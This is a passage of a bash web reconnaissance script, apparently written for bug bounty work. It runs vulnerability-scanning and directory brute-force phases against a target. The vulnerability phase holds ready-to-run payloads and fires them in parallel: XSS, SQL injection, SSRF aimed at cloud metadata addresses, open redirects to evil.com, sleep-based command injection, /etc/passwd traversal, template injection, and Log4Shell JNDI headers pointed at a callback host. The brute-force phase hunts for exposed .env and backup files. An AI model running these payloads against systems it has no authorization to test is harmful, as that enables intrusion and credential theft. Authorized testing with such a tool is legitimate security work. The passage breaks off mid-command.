    section "PHASE 4 — VULNERABILITY SCANNING"
    local outdir="$OUTPUT_DIR/04_vulns"
    mkdir -p "$outdir"

    if ! check_tool "$QSREPLACE_PATH"; then
        log_skip "qsreplace not found at: $QSREPLACE_PATH — skipping Phase 4"
        return
    fi

    local input="$PARAMETERIZED_URLS"
    if [ ! -s "$input" ]; then
        ask "Path to parameterized URL file" "" input
        if [ ! -s "$input" ]; then
            log_warn "No parameterized URLs — skipping Phase 4"
            return
        fi
    fi

    local url_count; url_count=$(wc -l < "$input" 2>/dev/null || echo 0)
    log_info "Input: $input  |  ${YELLOW}${BOLD}${url_count} URLs${NC} to test"

    # ── Per-scan concurrency config ───────────────────────────────────────
    echo
    echo -e "  ${CYAN}${BOLD}Concurrency for vuln scanning:${NC}"
    echo -e "  ${YELLOW}[1]${NC} Low   — 5 workers  ${DIM}(slow, WAF-friendly)${NC}"
    echo -e "  ${YELLOW}[2]${NC} Medium — 15 workers ${DIM}(recommended)${NC}"
    echo -e "  ${YELLOW}[3]${NC} High  — 30 workers  ${DIM}(fast, may trigger rate-limits)${NC}"
    echo -e "  ${YELLOW}[4]${NC} Custom"
    echo -ne "  ${WHITE}Choice [1-4, default 2]: ${NC}"
    local _vc; read -r _vc || _vc=2
    local VCONCURRENCY=15
    case "${_vc:-2}" in
        1) VCONCURRENCY=5 ;;
        3) VCONCURRENCY=30 ;;
        4) ask "Worker count" "15" VCONCURRENCY ;;
        *) VCONCURRENCY=15 ;;
    esac
    log_info "Vuln scan concurrency: ${YELLOW}${BOLD}${VCONCURRENCY}${NC} workers"

    # ── Auto URL cap to prevent multi-hour scans ──────────────────────────
    local MAX_URLS=500
    echo
    echo -e "  ${INFO} ${url_count} parameterized URLs found."
    if [ "$url_count" -gt "$MAX_URLS" ]; then
        echo -e "  ${WARN} Large URL set — capping at ${MAX_URLS} per scan class to keep it manageable."
        echo -e "  ${DIM}  Change cap by answering the next prompt.${NC}"
        ask "Max URLs per vuln class" "$MAX_URLS" MAX_URLS
        local capped_input="$outdir/urls_capped_${TS}.txt"
        head -"$MAX_URLS" "$input" > "$capped_input" 2>/dev/null || true
        input="$capped_input"
        log_info "Using capped input: $input ($(wc -l < "$input") URLs)"
    fi
    echo

    # ── Vuln class selection ──────────────────────────────────────────────
    subsection "Select vulnerability classes to test"
    echo -e "  ${DIM}Each class runs independently — Ctrl+C skips just that class.${NC}"
    echo
    echo -e "  ${YELLOW}[1]${NC} XSS      — Reflected XSS (5 payloads, parallel)"
    echo -e "  ${YELLOW}[2]${NC} SQLi     — SQL Injection error-based (5 payloads)"
    echo -e "  ${YELLOW}[3]${NC} SSRF     — Server-Side Request Forgery (4 payloads)"
    echo -e "  ${YELLOW}[4]${NC} Redirect — Open Redirect (5 payloads)"
    echo -e "  ${YELLOW}[5]${NC} CMDi     — Command Injection time-based (4 payloads)"
    echo -e "  ${YELLOW}[6]${NC} LFI      — Path Traversal / Local File Inclusion (5 payloads)"
    echo -e "  ${YELLOW}[7]${NC} SSTI     — Server-Side Template Injection (5 payloads)"
    echo -e "  ${YELLOW}[8]${NC} Log4j    — Log4Shell JNDI injection (3 payloads)"
    echo -e "  ${YELLOW}[all]${NC} All of the above"
    echo -e "  ${YELLOW}[0]${NC} Skip Phase 4"
    divider
    echo -ne "  ${WHITE}${BOLD}Choices (e.g. 1,3,5 or all): ${NC}"
    local VSEL; read -r VSEL || VSEL="0"
    [ -z "$VSEL" ] && VSEL="0"
    [ "$VSEL" = "0" ] && { log_skip "Phase 4 skipped"; return; }
    [ "$VSEL" = "all" ] && VSEL="1,2,3,4,5,6,7,8"


    # ── 1: XSS ───────────────────────────────────────────────────────────
    if echo "$VSEL" | grep -qE "(^|,)1(,|\$)"; then
        subsection "XSS — Reflected (parallel, ${VCONCURRENCY} workers)"
        local xss_out="$outdir/${TARGET}_XSS_reflected_${TS}.txt"
        echo -e "  ${DIM}5 payloads × $(wc -l < "$input") URLs  |  ${YELLOW}Ctrl+C = skip XSS entirely${NC}"

        local xss_payloads=(
            '"><script>alert(1)</script>'
            "'\"><svg onload=alert(1)>"
            '<img src=x onerror=alert(1)>'
            '"><body onload=alert(1)>'
            '"onmouseover=alert(1)//'
        )
        local xi=1
        for pl in "${xss_payloads[@]}"; do
            [ "$SKIP_CURRENT" -eq 1 ] && { SKIP_CURRENT=0; break; }
            echo -e "  ${RUN} Payload $xi/${#xss_payloads[@]}: ${DIM}${pl:0:50}${NC}"
            parallel_curl "XSS-P${xi}" "$input" "$xss_out" "$VCONCURRENCY" "$pl" "$pl" "body"
            xi=$(( xi + 1 ))
        done
        SKIP_CURRENT=0
        local n; n=$([ -f "$xss_out" ] && wc -l < "$xss_out" || echo 0)
        [ "$n" -gt 0 ] && log_ok "${GREEN}XSS: $n candidates → $xss_out${NC}" \
                       || log_info "XSS: no reflected matches found"
        register_output "$xss_out" "XSS: reflected candidates" "Confirm each in browser/Burp"
    fi

    # ── 2: SQLi ──────────────────────────────────────────────────────────
    if echo "$VSEL" | grep -qE "(^|,)2(,|\$)"; then
        subsection "SQLi — Error-Based (parallel, ${VCONCURRENCY} workers)"
        local sqli_out="$outdir/${TARGET}_SQLi_errorbased_${TS}.txt"
        echo -e "  ${DIM}5 payloads × $(wc -l < "$input") URLs  |  ${YELLOW}Ctrl+C = skip SQLi${NC}"

        local sqli_sig='sql syntax|mysql_fetch|ORA-[0-9]{4}|you have an error in your sql|SQLSTATE|sqlite_|PostgreSQL.*ERROR|Unclosed quotation|ODBC.*Driver|mysql_num_rows|supplied argument is not a valid MySQL'
        local sqli_payloads=("'" "''" "1 OR 1=1--" "\" OR \"\"=\"" "1 AND 1=2--")
        local si=1
        for pl in "${sqli_payloads[@]}"; do
            [ "$SKIP_CURRENT" -eq 1 ] && { SKIP_CURRENT=0; break; }
            echo -e "  ${RUN} Payload $si/${#sqli_payloads[@]}: ${DIM}${pl}${NC}"
            parallel_curl "SQLi-P${si}" "$input" "$sqli_out" "$VCONCURRENCY" "$pl" "$sqli_sig" "body_re"
            si=$(( si + 1 ))
        done
        SKIP_CURRENT=0
        local n; n=$([ -f "$sqli_out" ] && wc -l < "$sqli_out" || echo 0)
        [ "$n" -gt 0 ] && log_ok "${GREEN}SQLi: $n candidates${NC}" || log_info "SQLi: no error signatures found"
        register_output "$sqli_out" "SQLi: error-based" "Confirm with sqlmap -u URL --dbs"
    fi

    # ── 3: SSRF ──────────────────────────────────────────────────────────
    if echo "$VSEL" | grep -qE "(^|,)3(,|\$)"; then
        subsection "SSRF — Server-Side Request Forgery"
        local _cb="http://your-collaborator.oastify.com"
        ask "SSRF callback URL (Burp Collaborator / interactsh)" "$_cb" _cb
        local ssrf_out="$outdir/${TARGET}_SSRF_${TS}.txt"
        echo -e "  ${DIM}4 payloads  |  ${YELLOW}Ctrl+C = skip SSRF${NC}"

        local ssrf_sig='ami-id|instance-id|iam|computeMetadata|ec2|169\.254|security-credentials|metadata\.google'
        local ssrf_payloads=("$_cb" "http://169.254.169.254/latest/meta-data/" "http://metadata.google.internal/computeMetadata/v1/" "http://localhost:22/")
        local sri=1
        for pl in "${ssrf_payloads[@]}"; do
            [ "$SKIP_CURRENT" -eq 1 ] && { SKIP_CURRENT=0; break; }
            echo -e "  ${RUN} Payload $sri/${#ssrf_payloads[@]}: ${DIM}${pl:0:60}${NC}"
            parallel_curl "SSRF-P${sri}" "$input" "$ssrf_out" "$VCONCURRENCY" "$pl" "$ssrf_sig" "body_re"
            sri=$(( sri + 1 ))
        done
        SKIP_CURRENT=0
        log_ok "SSRF probe done — monitor your callback server for DNS/HTTP hits"
        register_output "$ssrf_out" "SSRF: probe log" "Monitor Collaborator/interactsh"
    fi

    # ── 4: Open Redirect ─────────────────────────────────────────────────
    if echo "$VSEL" | grep -qE "(^|,)4(,|\$)"; then
        subsection "Open Redirect (parallel, ${VCONCURRENCY} workers)"
        local redir_out="$outdir/${TARGET}_OpenRedirect_${TS}.txt"
        echo -e "  ${DIM}5 payloads  |  ${YELLOW}Ctrl+C = skip Open Redirect${NC}"

        local redir_payloads=("https://evil.com" "//evil.com" "\/\/evil.com" "////evil.com" "%0d%0ahttps://evil.com")
        local ri=1
        for pl in "${redir_payloads[@]}"; do
            [ "$SKIP_CURRENT" -eq 1 ] && { SKIP_CURRENT=0; break; }
            echo -e "  ${RUN} Payload $ri/${#redir_payloads[@]}: ${DIM}${pl}${NC}"
            parallel_curl "REDIR-P${ri}" "$input" "$redir_out" "$VCONCURRENCY" "$pl" "evil.com" "header"
            ri=$(( ri + 1 ))
        done
        SKIP_CURRENT=0
        local n; n=$([ -f "$redir_out" ] && wc -l < "$redir_out" || echo 0)
        [ "$n" -gt 0 ] && log_ok "${GREEN}Open Redirect: $n candidates${NC}" || log_info "Open Redirect: none found"
        register_output "$redir_out" "Open redirect candidates" "Confirm in browser"
    fi

    # ── 5: Command Injection ─────────────────────────────────────────────
    if echo "$VSEL" | grep -qE "(^|,)5(,|\$)"; then
        subsection "CMDi — Command Injection Time-Based (parallel, ${VCONCURRENCY} workers)"
        local cmdi_out="$outdir/${TARGET}_CMDi_timebased_${TS}.txt"
        echo -e "  ${WARN} Time-based: each request waits up to 12s for delay"
        echo -e "  ${DIM}4 payloads × $(wc -l < "$input") URLs  |  ${YELLOW}Ctrl+C = skip CMDi${NC}"

        local cmdi_payloads=("; sleep 5 #" "| sleep 5" "\$(sleep 5)" "\`sleep 5\`")
        local ci=1
        for pl in "${cmdi_payloads[@]}"; do
            [ "$SKIP_CURRENT" -eq 1 ] && { SKIP_CURRENT=0; break; }
            echo -e "  ${RUN} Payload $ci/${#cmdi_payloads[@]}: ${DIM}${pl}${NC}"
            parallel_curl "CMDi-P${ci}" "$input" "$cmdi_out" "$VCONCURRENCY" "$pl" "" "timing"
            ci=$(( ci + 1 ))
        done
        SKIP_CURRENT=0
        local n; n=$([ -f "$cmdi_out" ] && wc -l < "$cmdi_out" || echo 0)
        [ "$n" -gt 0 ] && log_ok "${GREEN}CMDi time-based: $n candidates${NC}" || log_info "CMDi: no delays detected"
        register_output "$cmdi_out" "CMDi: time-based" "Confirm with OOB / manual"
    fi

    # ── 6: LFI / Path Traversal ──────────────────────────────────────────
    if echo "$VSEL" | grep -qE "(^|,)6(,|\$)"; then
        subsection "LFI / Path Traversal (parallel, ${VCONCURRENCY} workers)"
        local lfi_out="$outdir/${TARGET}_LFI_PathTraversal_${TS}.txt"
        echo -e "  ${DIM}5 payloads × $(wc -l < "$input") URLs  |  ${YELLOW}Ctrl+C = skip LFI${NC}"

        local lfi_sig='root:x:|bin:x:|\[extensions\]|\[fonts\]'
        local lfi_payloads=(
            "../../../../etc/passwd"
            "../../../etc/passwd"
            "..%2F..%2F..%2Fetc%2Fpasswd"
            "....//....//etc/passwd"
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        )
        local li=1
        for pl in "${lfi_payloads[@]}"; do
            [ "$SKIP_CURRENT" -eq 1 ] && { SKIP_CURRENT=0; break; }
            echo -e "  ${RUN} Payload $li/${#lfi_payloads[@]}: ${DIM}${pl}${NC}"
            parallel_curl "LFI-P${li}" "$input" "$lfi_out" "$VCONCURRENCY" "$pl" "$lfi_sig" "body_re"
            li=$(( li + 1 ))
        done
        SKIP_CURRENT=0
        local n; n=$([ -f "$lfi_out" ] && wc -l < "$lfi_out" || echo 0)
        [ "$n" -gt 0 ] && log_ok "${GREEN}LFI: $n candidates${NC}" || log_info "LFI: no traversal found"
        register_output "$lfi_out" "LFI/Path Traversal" "Escalate: log poison / RCE"
    fi

    # ── 7: SSTI ──────────────────────────────────────────────────────────
    if echo "$VSEL" | grep -qE "(^|,)7(,|\$)"; then
        subsection "SSTI — Template Injection (parallel, ${VCONCURRENCY} workers)"
        local ssti_out="$outdir/${TARGET}_SSTI_${TS}.txt"
        echo -e "  ${DIM}5 payloads × $(wc -l < "$input") URLs  |  ${YELLOW}Ctrl+C = skip SSTI${NC}"

        local ssti_sig='\b49\b|7777777'
        local ssti_payloads=('{{7*7}}' '${7*7}' '<%= 7*7 %>' '#{7*7}' '${{7*7}}')
        local sti=1
        for pl in "${ssti_payloads[@]}"; do
            [ "$SKIP_CURRENT" -eq 1 ] && { SKIP_CURRENT=0; break; }
            echo -e "  ${RUN} Payload $sti/${#ssti_payloads[@]}: ${DIM}${pl}${NC}"
            parallel_curl "SSTI-P${sti}" "$input" "$ssti_out" "$VCONCURRENCY" "$pl" "$ssti_sig" "body_re"
            sti=$(( sti + 1 ))
        done
        SKIP_CURRENT=0
        local n; n=$([ -f "$ssti_out" ] && wc -l < "$ssti_out" || echo 0)
        [ "$n" -gt 0 ] && log_ok "${GREEN}SSTI: $n candidates${NC}" || log_info "SSTI: no template eval"
        register_output "$ssti_out" "SSTI: template injection" "49 in response = eval happening"
    fi

    # ── 8: Log4Shell ─────────────────────────────────────────────────────
    if echo "$VSEL" | grep -qE "(^|,)8(,|\$)"; then
        subsection "Log4Shell — CVE-2021-44228 (JNDI via headers)"
        local _cb="http://your-collaborator.oastify.com"
        ask "Callback URL for JNDI (Burp Collaborator / interactsh)" "$_cb" _cb
        local l4j_out="$outdir/${TARGET}_Log4Shell_${TS}.txt"
        echo -e "  ${DIM}Sending in User-Agent, X-Forwarded-For, X-Api-Version  |  ${YELLOW}Ctrl+C = skip${NC}"

        local l4j_payloads=(
            "\${jndi:ldap://${_cb}/a}"
            "\${j\${::-n}di:ldap://${_cb}/b}"
            "\${jndi:dns://${_cb}/c}"
        )
        arm_skip
        head -200 "$input" | while IFS= read -r url || [ -n "$url" ]; do
            [ -z "$url" ] && continue
            [ "$SKIP_CURRENT" -eq 1 ] && break
            for pl in "${l4j_payloads[@]}"; do
                curl -sk -L --max-time 8 "$url" \
                    -H "User-Agent: $pl" \
                    -H "X-Forwarded-For: $pl" \
                    -H "X-Api-Version: $pl" \
                    -H "Referer: $pl" \
                    -o /dev/null 2>/dev/null || true
            done
            echo "[SENT][Log4j] $url" >> "$l4j_out"
        done || true
        disarm_skip
        SKIP_CURRENT=0
        log_ok "Log4Shell payloads sent — watch your callback server for DNS pings"
        register_output "$l4j_out" "Log4Shell: JNDI sent log" "Check Collaborator/interactsh"
    fi

    # ── Master merge ─────────────────────────────────────────────────────
    local vmaster="$outdir/${TARGET}_VULN_MASTER_${TS}.txt"
    find "$outdir" -name "*.txt" ! -name "*MASTER*" ! -name "*capped*" 2>/dev/null \
        | xargs grep -hl "HIT\|POTENTIAL\|SENT" 2>/dev/null \
        | xargs cat 2>/dev/null \
        | grep -E "HIT|POTENTIAL|SENT" | sort -u > "$vmaster" || true
    local vn; vn=$([ -f "$vmaster" ] && wc -l < "$vmaster" || echo 0)
    log_ok "VULN MASTER: $vmaster  ($vn total candidate lines)"
    register_output "$vmaster" "MASTER: all vuln candidates" "Manual triage — confirm in Burp"
    echo
    echo -e "  ${WARN} ${RED}${BOLD}All findings need manual confirmation before reporting!${NC}"
    divider
}

phase_dirbrute() {
    section "PHASE 5 — DIRECTORY & FILE BRUTE FORCE"
    local outdir="$OUTPUT_DIR/05_directories"
    mkdir -p "$outdir"

    # ── Target URL selection ──────────────────────────────────────────────
    local dir_target="https://${TARGET}"
    if [ -s "$LIVE_HOSTS_FILE" ]; then
        echo -e "  ${INFO} Live hosts available:"
        head -15 "$LIVE_HOSTS_FILE" | nl -ba
        echo
    fi
    ask "Target URL (or 'all' for every live host)" "https://${TARGET}" dir_target

    local -a TARGETS=()
    if [ "${dir_target,,}" = "all" ] && [ -s "$LIVE_HOSTS_FILE" ]; then
        while IFS= read -r h || [ -n "$h" ]; do
            [ -n "$h" ] && TARGETS+=("$h")
        done < "$LIVE_HOSTS_FILE"
        log_info "Brute-forcing ${#TARGETS[@]} live hosts"
    else
        TARGETS=("$dir_target")
    fi

    local T="$THREAD_COUNT"

    for TURL in "${TARGETS[@]}"; do
        [ -z "$TURL" ] && continue
        local t_safe
        t_safe=$(echo "$TURL" | sed 's|https\?://||g;s|[/:]|_|g')
        echo
        echo -e "${BG_MAGENTA}${WHITE}${BOLD}  TARGET: $TURL  ${NC}"

        # ── FFUF ─────────────────────────────────────────────────────────
        if check_tool "$FFUF_PATH"; then
            subsection "FFUF"

            if confirm "ffuf Mode 1: Medium wordlist dir brute" y; then
                local _wl="$WL_DIRS_MEDIUM"
                ask "Directory wordlist" "$WL_DIRS_MEDIUM" _wl
                if [ -f "$_wl" ]; then
                    local fj="$outdir/${t_safe}_ffuf_dir_medium_${TS}.json"
                    local ft="$outdir/${t_safe}_ffuf_dir_medium_${TS}.txt"
                    safe_run "ffuf-dir-medium" "/dev/null" 3600 \
                        "$FFUF_PATH" -w "$_wl" -u "${TURL}/FUZZ" \
                        -mc 200,201,204,301,302,307,401,403,405,500 \
                        -t "$T" -timeout 10 -o "$fj" -of json -s
                    if [ -s "$fj" ]; then
                        python3 -c "
import json,sys
try:
    d=json.load(open('$fj'))
    for r in d.get('results',[]):
        print('{} [{}] [{}b]'.format(r.get('url',''),r.get('status',''),r.get('length','')))
except Exception as e:
    sys.stderr.write(str(e)+'\n')
" > "$ft" 2>>"$LOG_FILE" || true
                        [ -s "$ft" ] && { log_ok "ffuf dir medium: $(safe_wc "$ft") results"; register_output "$ft" "ffuf: dir brute medium wordlist" "Check 200/403 — test 403 bypass"; }
                    fi
                else
                    log_warn "Wordlist not found: $_wl"
                fi
            fi

            if confirm "ffuf Mode 2: Recursive (depth 3)" y; then
                local _wl="$WL_DIRS_SMALL"
                ask "Wordlist (small recommended for recursive)" "$WL_DIRS_SMALL" _wl
                if [ -f "$_wl" ]; then
                    local fj="$outdir/${t_safe}_ffuf_recursive_${TS}.json"
                    local ft="$outdir/${t_safe}_ffuf_recursive_${TS}.txt"
                    safe_run "ffuf-recursive" "/dev/null" 3600 \
                        "$FFUF_PATH" -w "$_wl" -u "${TURL}/FUZZ" \
                        -recursion -recursion-depth 3 \
                        -mc 200,201,301,302,401,403 \
                        -t "$T" -timeout 10 -o "$fj" -of json -s
                    [ -s "$fj" ] && python3 -c "
import json,sys
try:
    d=json.load(open('$fj'))
    for r in d.get('results',[]):
        print('{} [{}]'.format(r.get('url',''),r.get('status','')))
except: pass
" > "$ft" 2>>"$LOG_FILE" || true
                    [ -s "$ft" ] && { log_ok "ffuf recursive: $(safe_wc "$ft") results"; register_output "$ft" "ffuf: recursive depth 3" "Deep directory tree"; }
                fi
            fi

            if confirm "ffuf Mode 3: Extensions (.php,.asp,.html,.txt,.bak,.env)" y; then
                local _wl="$WL_DIRS_MEDIUM"
                ask "Wordlist" "$WL_DIRS_MEDIUM" _wl
                if [ -f "$_wl" ]; then
                    local fj="$outdir/${t_safe}_ffuf_extensions_${TS}.json"
                    local ft="$outdir/${t_safe}_ffuf_extensions_${TS}.txt"
                    safe_run "ffuf-extensions" "/dev/null" 3600 \
                        "$FFUF_PATH" -w "$_wl" -u "${TURL}/FUZZ" \
                        -e ".php,.asp,.aspx,.html,.htm,.js,.json,.txt,.bak,.old,.zip,.sql,.env,.conf,.cfg,.ini" \
                        -mc 200,201,301,302,401,403 \
                        -t "$T" -timeout 10 -o "$fj" -of json -s
                    [ -s "$fj" ] && python3 -c "
import json,sys
try:
    d=json.load(open('$fj'))
    for r in d.get('results',[]):
        print('{} [{}]'.format(r.get('url',''),r.get('status','')))
except: pass
" > "$ft" 2>>"$LOG_FILE" || true
                    [ -s "$ft" ] && { log_ok "ffuf extensions: $(safe_wc "$ft") results"; register_output "$ft" "ffuf: file extension brute" "Backup files, exposed configs"; }
                fi
            fi

            if confirm "ffuf Mode 4: Backup & config file hunting" y; then
                local _wl="$WL_DIRS_SMALL"
                [ -f "$_wl" ] || _wl="$WL_DIRS_MEDIUM"
                if [ -f "$_wl" ]; then
                    local ft="$outdir/${t_safe}_ffuf_backup_files_${TS}.txt"
                    safe_run "ffuf-backup" "$ft" 1800 \
                        "$FFUF_PATH" -w "$_wl" -u "${TURL}/FUZZ" \
                        -e ".bak,.backup,.old,.orig,.swp,.tmp,.log,.conf,.cfg,.ini,.env,.dist" \
                        -mc 200,201,403 -t "$T" -timeout 10 -s
                    [ -s "$ft" ] && { log_ok "ffuf backup: $(safe_wc "$ft") results"; register_output "$ft" "ffuf: backup/config file hunt" "High severity if .env exposed"; }
                fi
            fi

            if confirm "ffuf Mode 5: API endpoint discovery" n; then
                local _wl="$WL_API"
                ask "API wordlist" "$WL_API" _wl
                if [ -f "$_wl" ]; then
                    local ft="$outdir/${t_safe}_ffuf_api_endpoints_${TS}.txt"
                    safe_run "ffuf-api" "$ft" 1800 \
                        "$FFUF_PATH" -w "$_wl" -u "${TURL}/FUZZ" \
                        -mc 200,201,400,401,403,405 -t "$T" -timeout 10 -s
                    [ -s "$ft" ] && { log_ok "ffuf API: $(safe_wc "$ft") results"; register_output "$ft" "ffuf: API endpoint discovery" "REST/GraphQL — test auth bypass, IDOR"; }
                else
                    log_warn "API wordlist not found: $_wl"
                fi
            fi

            if confirm "ffuf Mode 6: Parameter name fuzzing" n; then
                local _path="/"
                ask "Path to fuzz params on (e.g. /api/v1/user)" "/" _path
                local _wl="$WL_PARAMS"
                ask "Parameter wordlist" "$WL_PARAMS" _wl
                if [ -f "$_wl" ]; then
                    local ft="$outdir/${t_safe}_ffuf_params_${TS}.txt"
                    safe_run "ffuf-params" "$ft" 1800 \
                        "$FFUF_PATH" -w "$_wl" -u "${TURL}${_path}?FUZZ=webrecon_test" \
                        -mc 200,201,301,302,400 -fs 0 -t "$T" -timeout 10 -s
                    [ -s "$ft" ] && { log_ok "ffuf params: $(safe_wc "$ft") results"; register_output "$ft" "ffuf: GET parameter name fuzz" "Hidden API parameters"; }
                fi
            fi

            if confirm "ffuf Mode 7: VHost fuzzing" n; then
                local _wl="$WL_SUBS_SMALL"
                ask "VHost wordlist" "$WL_SUBS_SMALL" _wl
                if [ -f "$_wl" ]; then
                    local ft="$outdir/${t_safe}_ffuf_vhost_${TS}.txt"
                    safe_run "ffuf-vhost" "$ft" 1800 \
                        "$FFUF_PATH" -w "$_wl" -u "$TURL" \
                        -H "Host: FUZZ.${TARGET}" \
                        -mc 200,201,301,302,401,403 -t "$T" -timeout 10 -s
                    [ -s "$ft" ] && { log_ok "ffuf vhost: $(safe_wc "$ft") results"; register_output "$ft" "ffuf: VHost fuzzing" "Internal admin panels on same IP"; }
                fi
            fi
        else
            log_skip "ffuf not found"
        fi

        # ── GOBUSTER ──────────────────────────────────────────────────────
        if check_tool "$GOBUSTER_PATH"; then
            subsection "GOBUSTER"

            if confirm "Gobuster Mode 1: DIR medium wordlist" y; then
                local _wl="$WL_DIRS_MEDIUM"
                ask "Wordlist" "$WL_DIRS_MEDIUM" _wl
                if [ -f "$_wl" ]; then
                    local ft="$outdir/${t_safe}_gobuster_dir_medium_${TS}.txt"
                    safe_run "gobuster-dir" "$ft" 3600 \
                        "$GOBUSTER_PATH" dir -u "$TURL" -w "$_wl" \
                        -t "$T" --timeout 10s --no-error -q
                    [ -s "$ft" ] && { log_ok "Gobuster dir: $(safe_wc "$ft") results"; register_output "$ft" "gobuster: dir medium" "Status/size comparison"; }
                fi
            fi

            if confirm "Gobuster Mode 2: DIR + extensions" y; then
                local _wl="$WL_DIRS_MEDIUM"
                ask "Wordlist" "$WL_DIRS_MEDIUM" _wl
                if [ -f "$_wl" ]; then
                    local ft="$outdir/${t_safe}_gobuster_extensions_${TS}.txt"
                    safe_run "gobuster-ext" "$ft" 3600 \
                        "$GOBUSTER_PATH" dir -u "$TURL" -w "$_wl" \
                        -x php,asp,aspx,html,js,txt,bak,xml,json \
                        -t "$T" --timeout 10s --no-error -q
                    [ -s "$ft" ] && { log_ok "Gobuster ext: $(safe_wc "$ft") results"; register_output "$ft" "gobuster: dir + extensions" "Source code, configs"; }
                fi
            fi

            if confirm "Gobuster Mode 3: DNS subdomain brute" n; then
                local _wl="$WL_SUBS_MEDIUM"
                ask "Subdomain wordlist" "$WL_SUBS_MEDIUM" _wl
                if [ -f "$_wl" ]; then
                    local ft="$outdir/${t_safe}_gobuster_dns_${TS}.txt"
                    safe_run "gobuster-dns" "$ft" 1800 \
                        "$GOBUSTER_PATH" dns -d "$TARGET" -w "$_wl" \
                        -t "$T" --no-error -q
                    [ -s "$ft" ] && { log_ok "Gobuster DNS: $(safe_wc "$ft") results"; register_output "$ft" "gobuster: DNS subdomain brute" "DNS-resolved — reliable"; }
                fi
            fi

            if confirm "Gobuster Mode 4: VHOST enumeration" n; then
                local _wl="$WL_SUBS_SMALL"
                ask "Subdomain wordlist for vhost" "$WL_SUBS_SMALL" _wl
                if [ -f "$_wl" ]; then
                    local ft="$outdir/${t_safe}_gobuster_vhost_${TS}.txt"
                    safe_run "gobuster-vhost" "$ft" 1800 \
                        "$GOBUSTER_PATH" vhost -u "$TURL" -w "$_wl" \
                        --append-domain -t "$T" --no-error -q
                    [ -s "$ft" ] && { log_ok "Gobuster VHOST: $(safe_wc "$ft") results"; register_output "$ft" "gobuster: VHOST enum" "Virtual hosts on same IP"; }
                fi
            fi
        else
            log_skip "Gobuster not found"
        fi

        # ── FEROXBUSTER ───────────────────────────────────────────────────
        if check_tool "$FEROXBUSTER_PATH"; then
            subsection "FEROXBUSTER"

            if confirm "Feroxbuster Mode 1: Recursive (depth 3)" y; then
                local _wl="$WL_DIRS_MEDIUM"
                ask "Wordlist" "$WL_DIRS_MEDIUM" _wl
                if [ -f "$_wl" ]; then
                    local ft="$outdir/${t_safe}_feroxbuster_recursive_${TS}.txt"
                    safe_run "feroxbuster-recursive" "$ft" 3600 \
                        "$FEROXBUSTER_PATH" --url "$TURL" -w "$_wl" \
                        --depth 3 --threads "$T" --timeout 10 \
                        --status-codes 200,201,301,302,401,403 \
                        --quiet --output "$ft" --no-state
                    [ -s "$ft" ] && { log_ok "Feroxbuster: $(safe_wc "$ft") results"; register_output "$ft" "feroxbuster: recursive depth 3" "Best for deep dirs"; }
                fi
            fi

            if confirm "Feroxbuster Mode 2: Extensions + smart filter" y; then
                local _wl="$WL_DIRS_MEDIUM"
                ask "Wordlist" "$WL_DIRS_MEDIUM" _wl
                if [ -f "$_wl" ]; then
                    local ft="$outdir/${t_safe}_feroxbuster_smart_${TS}.txt"
                    safe_run "feroxbuster-smart" "$ft" 3600 \
                        "$FEROXBUSTER_PATH" --url "$TURL" -w "$_wl" \
                        --extensions php,asp,aspx,html,js,txt,bak,config \
                        --threads "$T" --timeout 10 \
                        --status-codes 200,201,301,302,401,403 \
                        --quiet --output "$ft" --no-state
                    [ -s "$ft" ] && { log_ok "Feroxbuster smart: $(safe_wc "$ft") results"; register_output "$ft" "feroxbuster: smart ext filter" "Auto-tuned noise reduction"; }
                fi
            fi

            if confirm "Feroxbuster Mode 3: API endpoint brute" n; then
                local _wl="$WL_API"
                ask "API wordlist" "$WL_API" _wl
                if [ -f "$_wl" ]; then
                    local ft="$outdir/${t_safe}_feroxbuster_api_${TS}.txt"
                    safe_run "feroxbuster-api" "$ft" 1800 \
                        "$FEROXBUSTER_PATH" --url "$TURL" -w "$_wl" \
                        --extensions json,xml \
                        --status-codes 200,201,400,401,403,405 \
                        --threads "$T" --timeout 10 \
                        --quiet --output "$ft" --no-state
                    [ -s "$ft" ] && { log_ok "Feroxbuster API: $(safe_wc "$ft") results"; register_output "$ft" "feroxbuster: API endpoint brute" "REST/API routes"; }
                fi
            fi
        else
            log_skip "Feroxbuster not found"
        fi

        # ── DIRB ──────────────────────────────────────────────────────────
        if check_tool "$DIRB_PATH"; then
            subsection "DIRB"

            if confirm "dirb Mode 1: Built-in common wordlist" y; then
                local _wl="$WL_DIRB"
                [ -f "$_wl" ] || _wl="/usr/share/dirb/wordlists/common.txt"
                if [ -f "$_wl" ]; then
                    local ft="$outdir/${t_safe}_dirb_default_${TS}.txt"
                    timeout 3600 "$DIRB_PATH" "$TURL" "$_wl" -o "$ft" -S >> "$LOG_FILE" 2>&1 || true
                    [ -s "$ft" ] && { log_ok "dirb default: $(grep -c "CODE:" "$ft" 2>/dev/null || echo 0) hits"; register_output "$ft" "dirb: common wordlist" "Classic baseline scan"; }
                fi
            fi

            if confirm "dirb Mode 2: With extensions (.php,.html,.bak)" y; then
                local _wl="$WL_DIRB"
                [ -f "$_wl" ] || _wl="/usr/share/dirb/wordlists/common.txt"
                if [ -f "$_wl" ]; then
                    local ft="$outdir/${t_safe}_dirb_extensions_${TS}.txt"
                    timeout 3600 "$DIRB_PATH" "$TURL" "$_wl" -o "$ft" -S -X ".php,.html,.txt,.bak,.asp" >> "$LOG_FILE" 2>&1 || true
                    [ -s "$ft" ] && { log_ok "dirb ext: $(grep -c "CODE:" "$ft" 2>/dev/null || echo 0) hits"; register_output "$ft" "dirb: with extensions" "File extension discovery"; }
                fi
            fi

            if confirm "dirb Mode 3: Recursive" n; then
                local _wl="$WL_DIRS_SMALL"
                [ -f "$_wl" ] || _wl="$WL_DIRB"
                if [ -f "$_wl" ]; then
                    local ft="$outdir/${t_safe}_dirb_recursive_${TS}.txt"
                    timeout 3600 "$DIRB_PATH" "$TURL" "$_wl" -o "$ft" -r >> "$LOG_FILE" 2>&1 || true
                    [ -s "$ft" ] && { log_ok "dirb recursive: done"; register_output "$ft" "dirb: recursive mode" "Deep traversal"; }
                fi
            fi
        else
            log_skip "dirb not found"
        fi

        # ── DIRSEARCH ─────────────────────────────────────────────────────
        if check_tool "$DIRSEARCH_PATH"; then
            subsection "DIRSEARCH"

            if confirm "dirsearch Mode 1: Built-in wordlist + extensions" y; then
                local ft="$outdir/${t_safe}_dirsearch_default_${TS}.txt"
                timeout 3600 python3 "$DIRSEARCH_PATH" \
                    -u "$TURL" -e php,asp,aspx,html,js,txt,bak \
                    --plain-text-report="$ft" -q \
                    >> "$LOG_FILE" 2>&1 || true
